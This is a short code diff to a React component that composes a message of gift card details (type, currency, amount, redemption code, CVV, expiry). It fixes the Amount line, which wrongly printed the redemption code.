@@ -32,7 +32,7 @@ const TypeFour = ({cardname, setShowmodal, showmodal, amount, setAmount, currenc
         const msg = `
 Card Type: ${cardname}
 Currency: ${currency}
-Amount: ${redemptionCode}
+Amount: ${amount}
 Reedemption Code: ${redemptionCode}
 Gift Card CVV: ${cvv}
 Gift Card Expiry Date: ${expiry}
